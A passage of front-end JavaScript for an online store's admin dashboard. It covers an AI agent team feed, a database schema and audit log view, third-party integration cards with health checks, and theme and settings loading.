      const resp = typeof d.response === 'string' ? d.response : (typeof d.error === 'string' ? '⚠️ ' + d.error : '');
      aiteamFeedCard(a.id, resp.replace(/\n/g,'<br>'), 'autopilot');
    } catch(e) { /* silent — next tick will retry */ }
    loadPendingActions(); // (v9.4) keep the pending queue fresh on every autopilot tick
    if (document.getElementById('aiteamAutopilot')?.checked) {
      const interval = parseInt(document.getElementById('aiteamInterval').value, 10) || 600000;
      aiteamAutopilotTimer = setTimeout(tick, interval);
    }
  };
  const interval = parseInt(document.getElementById('aiteamInterval').value, 10) || 600000;
  aiteamAutopilotTimer = setTimeout(tick, interval);
}

// ── v9.4 additions for the AI Agent Team (appended here, chaining onto the
// functions above without touching them): grounded company snapshot card,
// localStorage-persisted conversation feed, and a compact meeting summary.
async function loadAITeamSnapshot() {
  const box = document.getElementById('aiteamSnapshot');
  if (!box) return;
  try {
    const r = await fetch(`${API}/api/owner/ai/snapshot`, { headers: { 'Authorization': 'Bearer ' + authToken } });
    const d = await r.json();
    if (!r.ok) throw new Error(d.error || `HTTP ${r.status}`);
    const fmtINR = v => '₹' + (Math.round(v) || 0).toLocaleString('en-IN');
    const items = [
      { label: 'Total Revenue', value: fmtINR(d.totalRevenue), icon: '💰' },
      { label: 'Today\'s Revenue', value: fmtINR(d.todayRevenue), icon: '📅' },
      { label: 'Orders', value: `${d.totalOrders} (${d.todayOrders} today)`, icon: '📦' },
      { label: 'Pending Fulfillment', value: d.pendingOrders, icon: '⏳' },
      { label: 'Customers', value: d.totalCustomers, icon: '👥' },
      { label: 'Products', value: `${d.totalProducts} (${(d.lowStock || []).length} low stock)`, icon: '🧴' },
      { label: 'Active Coupons', value: (d.activeCoupons || []).length, icon: '🎟️' },
      { label: 'Low Stock Items', value: (d.lowStock || []).map(p => `${p.name} (${p.stock})`).join(', ') || 'None ✓', icon: '⚠️' },
    ];
    box.innerHTML = items.map(it => `
      <div class="kpi" style="padding:10px;">
        <span class="kpi-ico">${it.icon}</span>
        <div class="kpi-label" style="margin-top:4px;">${it.label}</div>
        <div class="kpi-val" style="font-size:1.05rem;">${it.value}</div>
      </div>`).join('');
    box.dataset.filled = '1';
  } catch (e) {
    box.innerHTML = `<div style="color:var(--text3);font-size:0.8rem;grid-column:1/-1;text-align:center;padding:10px;">Snapshot unavailable (${e.message}) — ask an agent instead.</div>`;
  }
}

// ── Feed persistence (v9.4): the conversation survives a reload. Stored as
// HTML payloads keyed by agent, newest last, capped at 30 entries.
function aiteamPersistFeed() {
  try {
    const feed = document.getElementById('aiteamFeed');
    if (!feed) return;
    const items = Array.from(feed.children).map(c => ({ html: c.innerHTML, cls: c.className }));
    window.localStorage.setItem('ozylix-aiteam-feed', JSON.stringify(items.slice(0, 30)));
  } catch (_) { /* storage full or disabled — fail silently */ }
}
function aiteamRestoreFeed() {
  try {
    const feed = document.getElementById('aiteamFeed');
    if (!feed || feed.dataset.empty === 'false') return;
    let items = [];
    try { items = JSON.parse(window.localStorage.getItem('ozylix-aiteam-feed') || '[]'); } catch (_) { items = []; }
    if (!items.length) return;
    feed.innerHTML = '';
    feed.dataset.empty = 'false';
    items.slice().reverse().forEach(it => {
      const div = document.createElement('div');
      div.innerHTML = it.html;
      feed.appendChild(div.firstChild);
    });
  } catch (_) { /* restore is best-effort */ }
}
const _aiteamOrigFeedCard = window.aiteamFeedCard;
window.aiteamFeedCard = function (agentId, html, tag) {
  _aiteamOrigFeedCard(agentId, html, tag);
  aiteamPersistFeed();
};

// ── Meeting summary (v9.4): after a team meeting finishes, append a compact
// agenda card so the outcome is visible at a glance and persists in the feed.
const _aiteamOrigTeamMeeting = window.runTeamMeeting;
window.runTeamMeeting = async function () {
  await _aiteamOrigTeamMeeting();
  try {
    const aiteamFeedCardNow = window.aiteamFeedCard;
    aiteamFeedCardNow('CEO', `<strong>📋 Meeting summary</strong> — the team has reported in. Ask any agent for a deeper dive, or propose an action to act on what came up.`, 'meeting wrap-up');
  } catch (_) {}
};

// ── Load snapshot + restore feed when the page opens (chains onto the
// existing loader; the original also refreshes pending actions).
const _aiteamOrigLoadPage = window.loadAITeamPage;
if (typeof _aiteamOrigLoadPage === 'function') {
  window.loadAITeamPage = function () {
    _aiteamOrigLoadPage();
    loadAITeamSnapshot();
    aiteamRestoreFeed();
  };
}

// ═══════════════════════════════════════════════
// DATABASE
// ═══════════════════════════════════════════════
function renderSchemaOverview() {
  const tables = [
    {name:'products', cols:'id, name, category_id, mrp, sale_price, stock, rating, is_active, deleted_at', rows:'11+', ico:'🛍️'},
    {name:'orders', cols:'id, customer_id, address_id, discount_id, total_amount, status, payment_method, tracking_id', rows:'∞', ico:'📦'},
    {name:'order_items', cols:'id, order_id, product_id, product_name, unit_price, quantity, line_total', rows:'∞', ico:'📋'},
    {name:'customers', cols:'id, user_id, full_name, email, phone, city, state', rows:'∞', ico:'👥'},
    {name:'discounts', cols:'id, code, type, value, min_order_value, max_uses, uses, expires_at', rows:'5', ico:'🏷️'},
    {name:'payments', cols:'id, txn_id, order_id, method, amount, status, gateway_ref', rows:'∞', ico:'💳'},
    {name:'inventory_log', cols:'id, product_id, change_qty, reason, order_id, stock_after', rows:'∞', ico:'📊'},
    {name:'banners', cols:'id, title, image_url, link_url, position, sort_order, is_active', rows:'3', ico:'🖼️'},
    {name:'profiles', cols:'id, full_name, email, avatar_url, google_id, role, is_active', rows:'∞', ico:'👤'},
    {name:'media', cols:'id, file_name, storage_path, public_url, mime_type, size_bytes, product_id', rows:'∞', ico:'📸'},
    {name:'reviews', cols:'id, product_id, customer_id, rating, title, body, is_visible', rows:'∞', ico:'⭐'},
    {name:'audit_log', cols:'id, table_name, record_id, action, old_data, new_data, changed_by', rows:'∞', ico:'📝'},
    {name:'settings', cols:'key, value, description, updated_by, updated_at', rows:'6', ico:'⚙️'},
    {name:'categories', cols:'id, slug, label, description, sort_order', rows:'6', ico:'🗂️'},
  ];
  document.getElementById('schemaGrid').innerHTML = tables.map(t => `
    <div class="card" style="padding:14px;">
      <div style="display:flex;align-items:center;gap:8px;margin-bottom:8px;">
        <span style="font-size:1.2rem;">${t.ico}</span>
        <span style="font-family:var(--mono);font-size:0.82rem;font-weight:700;color:var(--green-text);">public.${t.name}</span>
        <span class="badge badge-gray" style="margin-left:auto;">${t.rows}</span>
      </div>
      <div style="font-size:0.68rem;color:var(--text3);font-family:var(--mono);line-height:1.7;">${t.cols.split(',').map(c=>`<span style="display:inline-block;background:var(--bg2);border-radius:3px;padding:1px 5px;margin:1px;">${c.trim()}</span>`).join('')}</div>
    </div>
  `).join('');
}

async function loadAuditLog() {
  try {
    const r = await apiFetch('/api/admin/audit');
    const d = (await r.json()).data || [];
    document.getElementById('auditTbody').innerHTML = d.slice(0,100).map(a => `
      <tr>
        <td><span class="badge badge-gray" style="font-family:var(--mono);">${a.table_name||'-'}</span></td>
        <td class="td-id">${a.record_id||'-'}</td>
        <td><span class="badge ${a.action==='INSERT'?'badge-green':a.action==='UPDATE'?'badge-blue':a.action==='SOFT_DELETE'?'badge-red':'badge-gray'}">${a.action||'-'}</span></td>
        <td style="font-size:0.75rem;">${a.user_id||a.changed_by||'system'}</td>
        <td style="font-size:0.72rem;color:var(--text3);">${fmtTime(a.created_at||a.changed_at)}</td>
      </tr>
    `).join('') || '<tr><td colspan="5" class="empty-state">No audit records</td></tr>';
  } catch(e) { document.getElementById('auditTbody').innerHTML = '<tr><td colspan="5" class="empty-state">Could not load audit log</td></tr>'; }
}

async function loadSoftDeletes() {
  const tables = ['products','orders','customers','discounts'];
  const results = {};
  for(const t of tables) {
    if(t==='products') { results[t] = allProducts.filter(p=>p.deleted_at); }
    else if(t==='orders') { results[t] = allOrders.filter(o=>o.deleted_at); }
    else if(t==='customers') { results[t] = allCustomers.filter(c=>c.deleted_at); }
    else if(t==='discounts') { results[t] = allDiscounts.filter(d=>d.deleted_at); }
  }
  document.getElementById('softDeleteCards').innerHTML = tables.map(t => `
    <div class="card">
      <div class="card-hdr">
        <span class="card-title" style="font-family:var(--mono);">${t}</span>
        <span class="badge badge-red">${results[t]?.length||0} deleted</span>
      </div>
      ${results[t]?.length ? results[t].slice(0,5).map(r => `
        <div style="display:flex;align-items:center;justify-content:space-between;padding:6px 0;border-bottom:1px solid var(--border);">
          <div>
            <div style="font-size:0.8rem;font-family:var(--mono);">${r.id}</div>
            <div style="font-size:0.7rem;color:var(--text3);">Deleted ${fmtDate(r.deleted_at)}</div>
          </div>
          ${t==='products'?`<button class="btn btn-primary btn-sm" onclick="restoreProduct(${r.id})">♻️ Restore</button>`:''}
        </div>
      `).join('') : '<div style="color:var(--text3);font-size:0.78rem;padding:8px 0;">✅ No deleted records</div>'}
    </div>
  `).join('');
}

function renderSqlSnippets() {
  const snippets = [
    {title:'Get Dashboard KPIs', sql:'SELECT * FROM get_dashboard_kpis();'},
    {title:'Validate Coupon', sql:"SELECT * FROM validate_coupon('GLOW20', 899);"},
    {title:'Restock Product', sql:"SELECT restock_product(4, 100, auth.uid());"},
    {title:'Purge Soft Deletes', sql:"SELECT * FROM purge_soft_deletes(30);"},
    {title:'Low Stock View', sql:"SELECT * FROM vw_low_stock;"},
    {title:'Revenue by Category', sql:"SELECT * FROM vw_revenue_by_category;"},
    {title:'Order Detail', sql:"SELECT * FROM vw_order_detail WHERE order_id='AVC-XXXX-YYYY';"},
    {title:'Soft Delete Record', sql:"SELECT soft_delete('orders', 'AVC-XXXX', auth.uid());"},
  ];
  document.getElementById('sqlSnippets').innerHTML = snippets.map(s => `
    <div style="background:var(--bg2);border-radius:8px;padding:12px;display:flex;align-items:center;justify-content:space-between;gap:12px;">
      <div>
        <div style="font-size:0.78rem;font-weight:600;color:var(--text2);margin-bottom:4px;">${s.title}</div>
        <code style="font-family:var(--mono);font-size:0.72rem;color:var(--green-text);">${s.sql}</code>
      </div>
      <button class="btn btn-secondary btn-sm" onclick="navigator.clipboard.writeText(\`${s.sql}\`).then(()=>toast('Copied!'))">📋</button>
    </div>
  `).join('');
}

// ═══════════════════════════════════════════════
// ═══════════════════════════════════════════════
// INTEGRATIONS
// ═══════════════════════════════════════════════
const INTEGRATIONS = [
  {
    id: 'supabase', name: 'Supabase', icon: '🗄️', category: 'Database',
    desc: 'PostgreSQL database, authentication & file storage',
    docsUrl: 'https://supabase.com/docs',
    envVars: ['SUPABASE_URL', 'SUPABASE_SERVICE_KEY'],
    checkUrl: () => `${API}/health`,
    checkAuth: false,
    setupSteps: [
      'Go to supabase.com → New Project',
      'Copy Project URL & Service Role Key',
      'Add to Render backend environment variables',
      'Run database migrations from Schema page'
    ],
    storageNote: 'Create bucket "product-images" (public) in Storage tab for image uploads'
  },
  {
    id: 'cashfree', name: 'Cashfree', icon: '💳', category: 'Payments',
    desc: 'Payment gateway — UPI, cards, net banking, EMI',
    docsUrl: 'https://docs.cashfree.com',
    envVars: ['CASHFREE_APP_ID', 'CASHFREE_SECRET_KEY'],
    checkUrl: () => `${API}/api/health/cashfree-env`,
    checkAuth: true,
    setupSteps: [
      'Sign up at cashfree.com/pg',
      'Go to Developers → API Keys',
      'Copy App ID and Secret Key',
      'Set CASHFREE_ENV=PROD for live payments'
    ]
  },
  {
    id: 'shiprocket', name: 'Shiprocket', icon: '🚚', category: 'Logistics',
    desc: 'Shipping, tracking & courier management',
    docsUrl: 'https://apidocs.shiprocket.in',
    envVars: ['SHIPROCKET_EMAIL', 'SHIPROCKET_PASSWORD'],
    checkUrl: () => `${API}/api/health/shiprocket`,
    checkAuth: true,
    setupSteps: [
      'Sign up at shiprocket.in',
      'Add your warehouse under Settings → Warehouses',
      'Set pickup location name in backend config',
      'Add email & password as env variables'
    ]
  },
  {
    id: 'twilio', name: 'Twilio WhatsApp', icon: '📱', category: 'Messaging',
    desc: 'WhatsApp order notifications & admin reports',
    docsUrl: 'https://www.twilio.com/docs/whatsapp',
    envVars: ['TWILIO_ACCOUNT_SID', 'TWILIO_AUTH_TOKEN', 'TWILIO_WHATSAPP_FROM'],
    checkUrl: () => `${API}/api/admin/whatsapp/preview`,
    checkAuth: true,
    setupSteps: [
      'Sign up at twilio.com',
      'Enable WhatsApp Sandbox or Business account',
      'Copy Account SID, Auth Token',
      'Set from number as whatsapp:+14155238886'
    ]
  },
  {
    id: 'nodemailer', name: 'Email (Nodemailer)', icon: '📧', category: 'Messaging',
    desc: 'Order confirmation & shipping emails to customers',
    docsUrl: 'https://nodemailer.com',
    envVars: ['MAIL_USER', 'MAIL_PASSWORD', 'MAIL_FROM'],
    checkUrl: null,
    checkAuth: false,
    setupSteps: [
      'Use Gmail: enable 2FA on your Google account, create an App Password',
      'Set MAIL_USER=your@gmail.com',
      'Set MAIL_PASSWORD=your-app-password',
      'Optional: use SendGrid SMTP for higher volumes'
    ]
  },
  {
    id: 'google_oauth', name: 'Google OAuth', icon: '🔑', category: 'Auth',
    desc: 'One-click Google login for customers',
    docsUrl: 'https://console.cloud.google.com',
    envVars: ['GOOGLE_CLIENT_ID', 'GOOGLE_CLIENT_SECRET'],
    checkUrl: null,
    checkAuth: false,
    setupSteps: [
      'Go to console.cloud.google.com → Credentials',
      'Create OAuth 2.0 Client ID (Web Application)',
      'Add your domain to Authorized Origins',
      'Copy Client ID to frontend & backend env'
    ]
  },
  {
    id: 'ga4', name: 'Google Analytics 4', icon: '📊', category: 'Analytics',
    desc: 'Customer behaviour, conversion & traffic tracking',
    docsUrl: 'https://analytics.google.com',
    envVars: ['GA4 Measurement ID: G-PSRK3R6L0Z'],
    checkUrl: null,
    checkAuth: false,
    setupSteps: [
      'Already configured in frontend (G-PSRK3R6L0Z)',
      'Go to analytics.google.com to view reports',
      'Set up Goals for Add to Cart & Checkout events',
      'Enable Enhanced Ecommerce in GA4 settings'
    ]
  },
  {
    id: 'instagram', name: 'Instagram Feed', icon: '📸', category: 'Social',
    desc: 'Live Instagram posts shown on website homepage',
    docsUrl: 'https://developers.facebook.com/docs/instagram-basic-display-api',
    envVars: ['INSTAGRAM_ACCESS_TOKEN'],
    checkUrl: () => `${API}/api/instagram`,
    checkAuth: false,
    setupSteps: [
      'Go to developers.facebook.com → My Apps',
      'Add Instagram Basic Display product',
      'Generate a long-lived access token',
      'Add INSTAGRAM_ACCESS_TOKEN to backend env'
    ]
  },
  {
    id: 'render', name: 'Render (Backend Host)', icon: '☁️', category: 'Infrastructure',
    desc: 'Node.js backend hosting — auto-deploy from GitHub',
    docsUrl: 'https://render.com/docs',
    envVars: ['All env vars set in Render Dashboard → Environment'],
    checkUrl: () => `${API}/health`,
    checkAuth: false,
    setupSteps: [
      'Backend already deployed at ascovitahealthcare-cell-github-io.onrender.com',
      'Set all env variables in Render → Environment tab',
      'Free tier sleeps after 15 min — upgrade to avoid cold starts',
      'Connect GitHub for auto-deploy on push'
    ]
  },
  {
    // Replaced a stale Razorpay entry that described an integration which
    // never existed in the backend — it listed RAZORPAY_* env vars and a
    // PAYMENT_GATEWAY switch that no code reads. Cashfree is the real
    // second gateway.
    id: 'cashfree', name: 'Cashfree Payments', icon: '💰', category: 'Payments',
    desc: 'Second payment gateway alongside GoKwik — UPI, cards, net banking, wallets',
    docsUrl: 'https://docs.cashfree.com/reference/pg-new-apis-endpoint',
    envVars: ['CASHFREE_APP_ID', 'CASHFREE_SECRET_KEY', 'CASHFREE_ENV'],
    // 2026-08-19 (Manus audit F1): /api/health/* routes now require an admin token,
    // so this card must send its Bearer token where it used to send nothing.
    checkUrl: '/api/health/cashfree-env',
    checkAuth: true,
    setupSteps: [
      'Sign up at cashfree.com and complete KYC',
      'Dashboard → Developers → API Keys, copy App ID and Secret Key',
      'Set CASHFREE_APP_ID, CASHFREE_SECRET_KEY, CASHFREE_ENV=PRODUCTION in Render',
      'Add the webhook URL: <backend>/api/cashfree-webhook (Dashboard → Webhooks)',
      'Run one sandbox transaction end-to-end before going live'
    ]
  },
  {
    // This card used to read "Delhivery / Blue Dart — additional courier
    // partners via Shiprocket multi-courier", with Shiprocket setup steps and
    // no health check. That was wrong: Shiprocket is a reseller, Delhivery is
    // a carrier we hold a direct account with at one.delhivery.com, and the
    // backend talks straight to Delhivery's API with our own token, warehouse
    // and waybills — Shiprocket is not involved at any point.
    id: 'delhivery', name: 'Delhivery (direct)', icon: '📦', category: 'Logistics',
    desc: 'Direct Delhivery account — shipment booking, AWB, tracking & NDR',
    docsUrl: 'https://one.delhivery.com/',
    envVars: ['DELHIVERY_API_TOKEN', 'DELHIVERY_ENV', 'DELHIVERY_PICKUP_LOCATION',
              'DELHIVERY_PICKUP_ADDRESS', 'DELHIVERY_PICKUP_CITY', 'DELHIVERY_PICKUP_STATE',
              'DELHIVERY_PICKUP_PIN', 'DELHIVERY_PICKUP_PHONE',
              'DELHIVERY_SELLER_GST_TIN', 'DELHIVERY_HSN_CODE', 'DELHIVERY_WEBHOOK_SECRET'],
    checkUrl: () => `${API}/api/health/delhivery`,
    checkAuth: true,
    setupSteps: [
      'Delhivery One → Settings → API Setup → copy the API token',
      'DELHIVERY_PICKUP_LOCATION must match the warehouse Facility Name exactly',
      'Keep the wallet topped up — Delhivery rejects bookings at ₹0',
      'Register the webhook: <backend>/api/delhivery/webhook/<DELHIVERY_WEBHOOK_SECRET>',
      'Ship an order from the order screen → "Ship with Delhivery"'
    ]
  },
  {
    id: 'gst', name: 'GST / Tax Compliance', icon: '📋', category: 'Compliance',
    desc: 'GSTIN, HSN codes & auto-invoice generation',
    docsUrl: 'https://www.gst.gov.in',
    envVars: ['GST_NUMBER', 'CGST_RATE=9', 'SGST_RATE=9'],
    checkUrl: null,
    checkAuth: false,
    setupSteps: [
      'Add your GSTIN in Settings → Store Settings',
      'HSN code 30049099 pre-set for nutraceuticals',
      'Invoices auto-generated on paid orders',
      'Download PDF invoices from Invoices page'
    ]
  },
];

// Track which integrations are connected (persisted in localStorage)
function getIntegrationState(id) {
  try { return JSON.parse(localStorage.getItem('int_'+id) || 'null'); } catch { return null; }
}
function setIntegrationState(id, connected) {
  localStorage.setItem('int_'+id, JSON.stringify(connected));
}

function renderIntegrations() {
  const catOrder = ['Database','Payments','Logistics','Messaging','Auth','Analytics','Social','Infrastructure','Compliance'];
  const grouped = {};
  INTEGRATIONS.forEach(intg => {
    if(!grouped[intg.category]) grouped[intg.category] = [];
    grouped[intg.category].push(intg);
  });

  let html = '';
  catOrder.forEach(cat => {
    if(!grouped[cat]) return;
    html += `<div style="grid-column:1/-1;font-size:0.7rem;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:1.2px;padding:4px 0 8px;border-bottom:1px solid var(--border);margin-top:8px;">${cat}</div>`;
    grouped[cat].forEach(intg => {
      const state = getIntegrationState(intg.id);
      const isConnected = state === true;
      const steps = intg.setupSteps.map(s => `<li style="margin-bottom:4px">${s}</li>`).join('');
      const envList = intg.envVars.map(e => `<code style="display:block;background:var(--bg2);padding:2px 8px;border-radius:4px;margin-bottom:3px;font-size:0.68rem;color:var(--green-text)">${e}</code>`).join('');
      html += `
      <div class="card" style="padding:16px;">
        <div style="display:flex;align-items:flex-start;gap:12px;">
          <div style="font-size:2rem;line-height:1;flex-shrink:0;">${intg.icon}</div>
          <div style="flex:1;min-width:0;">
            <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;">
              <div style="font-weight:700;font-size:0.92rem;">${intg.name}</div>
              <span class="badge ${isConnected?'badge-green':'badge-gray'}" id="intBadge_${intg.id}">${isConnected?'✅ Connected':'⚫ Not set'}</span>
            </div>
            <div style="font-size:0.76rem;color:var(--text3);margin-top:3px;margin-bottom:10px;">${intg.desc}</div>

            <!-- Env Variables -->
            <div style="margin-bottom:10px;">${envList}</div>

            <!-- Setup Steps (collapsible) -->
            <details style="margin-bottom:10px;">
              <summary style="font-size:0.74rem;color:var(--text2);cursor:pointer;font-weight:600;">📋 Setup Instructions</summary>
              <ol style="font-size:0.74rem;color:var(--text3);padding-left:16px;margin-top:8px;line-height:1.7;">${steps}</ol>
              ${intg.storageNote ? `<div style="font-size:0.72rem;background:#fff3cd;border-radius:6px;padding:6px 10px;margin-top:6px;color:#856404;">⚠️ ${intg.storageNote}</div>` : ''}
            </details>

            <!-- Action Buttons -->
            <div style="display:flex;gap:6px;flex-wrap:wrap;align-items:center;">
              ${intg.checkUrl ? `<button class="btn btn-secondary btn-sm" onclick="testIntegration('${intg.id}')">🔍 Test</button>` : ''}
              <button class="btn btn-${isConnected?'danger':'primary'} btn-sm" onclick="toggleIntegration('${intg.id}',${!isConnected})" id="intBtn_${intg.id}">
                ${isConnected ? '🔌 Disconnect' : '🔗 Mark Connected'}
              </button>
              ${intg.docsUrl ? `<a href="${intg.docsUrl}" target="_blank" class="btn btn-secondary btn-sm">📖 Docs</a>` : ''}
            </div>
          </div>
        </div>
      </div>`;
    });
  });

  document.getElementById('integrationCards').innerHTML = html;
}

async function testIntegration(id) {
  const intg = INTEGRATIONS.find(i => i.id === id);
  if(!intg || !intg.checkUrl) return;
  const badge = document.getElementById('intBadge_'+id);
  if(badge) { badge.className='badge badge-gray'; badge.textContent='⏳ Testing…'; }
  try {
    const headers = intg.checkAuth ? {'Authorization':`Bearer ${authToken}`} : {};
    const r = await fetch(intg.checkUrl(), {headers, signal:AbortSignal.timeout(sweepBudgetMs || 8000)});
    if(r.ok) {
      // Health endpoints return JSON with a status field — check it
      // Accept: "ok", "connected", "env_missing" (set in Render), or HTTP 200 with no status
      const PASSING_STATUSES = ['ok', 'connected'];
      const WARN_STATUSES    = ['env_missing', 'auth_error'];
      let connected = true;
      let detail = '';
      try {
        const json = await r.json();
        if(json.status) {
          if(PASSING_STATUSES.includes(json.status)) {
            connected = true;
            detail = json.detail || '';
            // Extra check: "env_missing" means backend is alive but creds not set yet
          } else if(WARN_STATUSES.includes(json.status)) {
            connected = false;
            detail = json.detail || json.status;
          } else if(json.status === 'error' || json.status === 'unreachable') {
            connected = false;
            detail = json.detail || json.status;
          }
          // Unknown status string — treat HTTP 200 as passing
        }
      } catch(_) { /* non-JSON endpoint — HTTP 200 is enough */ }
      if(connected) {
        if(badge) { badge.className='badge badge-green'; badge.textContent='✅ Online'; }
        /* Success pills are noise on first load — the badge already shows
           the status. Toasts still fire on manual 'Test' / 'Check All'. */
        if (!silentIntgCheck) toast(`${intg.name} is online ✅`);
        setIntegrationState(id, true);
        updateIntegrationBtn(id, true);
      } else {
        if(badge) { badge.className='badge badge-gold'; badge.textContent='⚠️ Config Error'; }
        /* Config errors matter — always toast, but collapse on mobile. */
        toast(`${intg.name}: ${detail || 'credentials not configured'}`, 'error');
      }
    } else {
      if(badge) { badge.className='badge badge-gold'; badge.textContent='⚠️ Error '+r.status; }
      if (!silentIntgCheck) toast(`${intg.name} returned ${r.status}`, 'error');
    }
  } catch(e) {
    if(badge) { badge.className='badge badge-red'; badge.textContent='❌ Offline'; }
    if (!silentIntgCheck) toast(`${intg.name} unreachable: ${e.message}`, 'error');
  }
}
/* Set during the automatic startup sweep so healthy-service pills don't
   stack over the dashboard; manual checks (Check All / Test) unset it. */
let silentIntgCheck = true;
/* Check everything in parallel instead of one-by-one. Startup sweep gets a
   tight 4s per-check budget (healthy services flip their badges fast and a
   dead service can't stall the dashboard); manual 'Check All' keeps 6s.
   Per-check fetch timeout inside testIntegration() adapts to the same budget. */
let sweepBudgetMs = 0;
async function checkIntegrations(manual=false) {
  silentIntgCheck = !manual;
  sweepBudgetMs = manual ? 6000 : 4000;
  await Promise.all(INTEGRATIONS.filter(i => i.checkUrl).map(i => testIntegration(i.id)));
  sweepBudgetMs = 0;
  silentIntgCheck = false;
}

function toggleIntegration(id, connect) {
  setIntegrationState(id, connect);
  const badge = document.getElementById('intBadge_'+id);
  if(badge) { badge.className = 'badge '+(connect?'badge-green':'badge-gray'); badge.textContent = connect?'✅ Connected':'⚫ Not set'; }
  updateIntegrationBtn(id, connect);
  toast(connect ? `${id} marked as connected` : `${id} disconnected`);
}

function updateIntegrationBtn(id, connected) {
  const btn = document.getElementById('intBtn_'+id);
  if(!btn) return;
  btn.className = 'btn btn-'+(connected?'danger':'primary')+' btn-sm';
  btn.textContent = connected ? '🔌 Disconnect' : '🔗 Mark Connected';
  btn.setAttribute('onclick', `toggleIntegration('${id}',${!connected})`);
}

async function checkIntegrations() {
  for(const intg of INTEGRATIONS) {
    if(intg.checkUrl) await testIntegration(intg.id);
  }
}

// ═══════════════════════════════════════════════
// SETTINGS
// ═══════════════════════════════════════════════

// ─── Interface Theme (Deluxe / Neomorphism / Liquid Glass) ───
// All three themes share the same HTML, JS and data — only the visual
// skin changes. Stored in localStorage for instant, flash-free load,
// and synced to the shared backend settings so the choice is visible
// to every admin/owner who opens the backoffice, not just this device.
const PALETTE_KEY = 'ascovita_theme';
const LAYOUT_THEME_KEY = 'ascovita_layout_theme';
// Keep THEME_KEY as an alias for older code paths and saved local sessions.
const THEME_KEY = PALETTE_KEY;
const VALID_PALETTES = ['plum','ocean','forest','coral'];
const VALID_THEMES = ['command','studio','signal','deluxe','neo','holo','frost','elysia','navy'];
const PALETTE_ALIASES = { deluxe:'plum', neo:'plum', holo:'ocean', frost:'ocean', elysia:'coral', navy:'ocean' };
const THEME_ALIASES = { deluxe:'command', neo:'studio', holo:'signal', frost:'studio', elysia:'studio', navy:'signal' };

function applyPaletteClass(palette) {
  palette = PALETTE_ALIASES[palette] || palette;
  palette = VALID_PALETTES.includes(palette) ? palette : 'plum';
  document.body.className.split(/\s+/).forEach(c => {
    if (c.startsWith('theme-')) document.body.classList.remove(c);
  });
  document.body.classList.add('theme-' + palette);
  document.querySelectorAll('.palette-opt').forEach(el => {
    el.classList.toggle('selected', el.dataset.theme === palette);
  });
}
// Backward-compatible name used by older inline handlers.
function applyThemeClass(palette) { applyPaletteClass(palette); }

function applyDashboardTheme(theme) {
  theme = THEME_ALIASES[theme] || theme;
  theme = VALID_THEMES.includes(theme) ? theme : 'command';
  document.body.className.split(/\s+/).forEach(c => {
    if (c.startsWith('mode-')) document.body.classList.remove(c);
  });
  document.body.classList.add('mode-' + theme);
  document.querySelectorAll('.layout-theme-opt').forEach(el => {
    el.classList.toggle('selected', el.dataset.theme === theme);
  });
}

async function setInterfaceTheme(palette, opts) {
  opts = opts || {};
  applyPaletteClass(palette);
  try { localStorage.setItem(PALETTE_KEY, PALETTE_ALIASES[palette] || palette); } catch {}
  if (opts.silent) return;
  try {
    const r = await apiFetch('/api/admin/settings', {method:'PUT', body:JSON.stringify({interface_theme: PALETTE_ALIASES[palette] || palette})});
    if (r && r.ok) toast('Theme updated ✅');
    else toast('Theme applied locally — server save failed', 'warning');
  } catch (e) {
    // Theme is already applied client-side; backend sync is best-effort.
    toast('Theme applied locally — offline', 'warning');
  }
}

async function setDashboardTheme(theme, opts) {
  opts = opts || {};
  applyDashboardTheme(theme);
  const normalized = THEME_ALIASES[theme] || theme;
  try { localStorage.setItem(LAYOUT_THEME_KEY, normalized); } catch {}
  if (opts.silent) return;
  try {
    const r = await apiFetch('/api/admin/settings', {method:'PUT', body:JSON.stringify({interface_theme_style: normalized})});
    if (r && r.ok) toast('Dashboard style updated ✅');
    else toast('Dashboard style applied locally — server save failed', 'warning');
  } catch (e) { toast('Dashboard style applied locally — offline', 'warning'); }
}

async function loadSettings() {
  // Apply the locally-remembered theme immediately so the Settings page
  // (and rest of the app) never flashes the wrong skin before the network call resolves.
  applyPaletteClass(localStorage.getItem(PALETTE_KEY));
  applyDashboardTheme(localStorage.getItem(LAYOUT_THEME_KEY));
  try {
    const r = await apiFetch('/api/admin/settings');
    if(!r.ok) return; // silently skip if endpoint doesn't exist yet
    const raw = await r.json();
    const d = raw.data || raw;
    const asObj = (value) => {
      if (value && typeof value === 'object') return value;
      if (typeof value === 'string') { try { const parsed = JSON.parse(value); return parsed && typeof parsed === 'object' ? parsed : {}; } catch (_) {} }
      return {};
    };
    const policy = asObj(d.delivery_policy);
    const freeShipping = asObj(d.free_shipping);
    const boolValue = (value, fallback) => value === undefined ? fallback : (value === true || value === 'true');
    if(d.store_online !== undefined || policy.store_online !== undefined) document.getElementById('storeOnline').checked = boolValue(d.store_online ?? policy.store_online, true);
    if(d.shipping_mode !== undefined || policy.shipping_mode !== undefined) { const sm = document.getElementById('shippingMode'); if (sm) sm.value = policy.shipping_mode ?? d.shipping_mode; }
    if(d.shipping_fee !== undefined || policy.shipping_fee !== undefined) { const sf = document.getElementById('shippingFee'); if (sf) sf.value = policy.shipping_fee ?? d.shipping_fee; }
    // delivery_policy is the canonical source. Legacy top-level keys are only
    // fallbacks so an old, conflicting row cannot make the panel show a state
    // different from the policy enforced by checkout.
    const codEnabled = policy.cod_enabled ?? d.cod_enabled ?? d.cod_available;
    if(codEnabled !== undefined) document.getElementById('codAvailable').checked = boolValue(codEnabled, false);
    if(d.cod_min_order !== undefined || policy.cod_min_order !== undefined) { const cm = document.getElementById('codMinOrder'); if (cm) cm.value = policy.cod_min_order ?? d.cod_min_order; }
    if(d.cod_max_order !== undefined || policy.cod_max_order !== undefined) { const cx = document.getElementById('codMaxOrder'); if (cx) cx.value = policy.cod_max_order ?? d.cod_max_order; }
    const codAll = policy.cod_allowed_all_orders ?? d.cod_allowed_all_orders;
    if(codAll !== undefined) document.getElementById('codAllowedAllOrders').checked = boolValue(codAll, true);
    const freeThreshold = policy.free_shipping_threshold ?? d.free_shipping_threshold ?? freeShipping.threshold;
    if(freeThreshold !== undefined) document.getElementById('freeShippingThreshold').value = freeThreshold;
    if(d.whatsapp_number) document.getElementById('whatsappNumber').value = d.whatsapp_number;
    if(d.gst_rate) { document.getElementById('cgstRate').value = d.gst_rate.cgst||2.5; document.getElementById('sgstRate').value = d.gst_rate.sgst||2.5; }
    if(d.razorpay_mode) document.getElementById('pgMode').value = d.razorpay_mode;
